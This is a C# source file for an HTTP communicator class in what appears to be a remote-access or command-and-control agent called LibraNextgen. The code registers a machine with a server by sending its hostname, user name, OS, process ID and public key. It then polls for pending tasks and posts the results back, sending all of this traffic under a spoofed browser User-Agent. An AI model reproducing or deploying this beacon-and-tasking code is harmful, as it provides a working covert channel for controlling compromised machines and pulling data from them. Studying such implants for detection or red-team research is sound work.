using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using LibraNextgen.Agent.Core;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Communication;

public class HttpCommunicator : ICommunicator
{
    private readonly HttpClient _http;
    private readonly ConfigManager _config;

    public HttpCommunicator(ConfigManager config)
    {
        _config = config;
        _http = new HttpClient();
        _http.DefaultRequestHeaders.Add("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    }

    public async Task<string> RegisterAsync(
        string hostname, string userName, string os, string arch,
        string publicKey, CancellationToken ct)
    {
        var payload = new
        {
            hostname, userName,
            osVersion = os, arch,
            processName = "agent",
            pid = Environment.ProcessId,
            isElevated = false,
            publicKey
        };

        var response = await _http.PostAsJsonAsync(_config.GetRegisterUrl(), payload, ct);
        if (!response.IsSuccessStatusCode) return string.Empty;

        var content = await response.Content.ReadAsStringAsync(ct);
        using var doc = JsonDocument.Parse(content);
        return doc.RootElement.GetProperty("agent_id").GetString() ?? string.Empty;
    }

    public async Task<AgentTask?> HeartbeatAsync(string agentId, CancellationToken ct)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, _config.GetHeartbeatUrl());
        request.Headers.Add("X-Agent-Id", agentId);
        request.Content = new StringContent("{}", Encoding.UTF8, "application/json");

        var response = await _http.SendAsync(request, ct);
        if (!response.IsSuccessStatusCode) return null;

        var content = await response.Content.ReadAsStringAsync(ct);
        using var doc = JsonDocument.Parse(content);

        if (!doc.RootElement.TryGetProperty("pendingTask", out var taskElement) ||
            taskElement.ValueKind == JsonValueKind.Null)
            return null;

        return JsonSerializer.Deserialize<AgentTask>(taskElement.GetRawText());
    }

    public async Task SubmitResultAsync(string agentId, string resultJson, CancellationToken ct)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, _config.GetResultUrl());
        request.Headers.Add("X-Agent-Id", agentId);
        request.Content = new StringContent(resultJson, Encoding.UTF8, "application/json");
        await _http.SendAsync(request, ct);
    }
}
